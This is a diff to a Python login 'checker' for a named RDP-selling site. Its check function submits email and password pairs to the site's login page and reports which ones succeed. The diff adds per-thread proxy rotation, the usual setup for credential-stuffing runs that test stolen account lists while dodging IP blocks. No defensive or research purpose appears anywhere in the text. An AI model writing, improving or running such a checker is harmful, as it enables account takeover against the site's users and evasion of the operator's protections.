@@ -1,7 +1,9 @@
 """
 Checker for RDP Arena (www.rdparena.com) – Improved false‑positive prevention.
+Supports proxy rotation via thread‑local variable.
 """
 import requests
+import threading
 from typing import Tuple
 
 BASE_URL = "https://www.rdparena.com/"
@@ -9,7 +11,15 @@ LOGIN_URL = BASE_URL + "payments/login"
 TIMEOUT = 15
 
 def check(email: str, password: str) -> Tuple[bool, str]:
+    # Get proxy from thread-local storage (set by runner)
+    proxy = getattr(threading.current_thread(), 'proxy', None)
+
     session = requests.Session()
+    if proxy:
+        session.proxies = {
+            "http": proxy,
+            "https": proxy
+        }
     session.headers.update({
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -40,7 +50,6 @@ def check(email: str, password: str) -> Tuple[bool, str]:
                 if any(word in location.lower() for word in ["dashboard", "account", "home", "panel"]):
                     return True, f"Login successful (redirect to {location})"
                 else:
-                    # Still a redirect – likely success
                     return True, f"Login successful (redirect to {location})"
 
             # --- 200 OK – inspect content ---
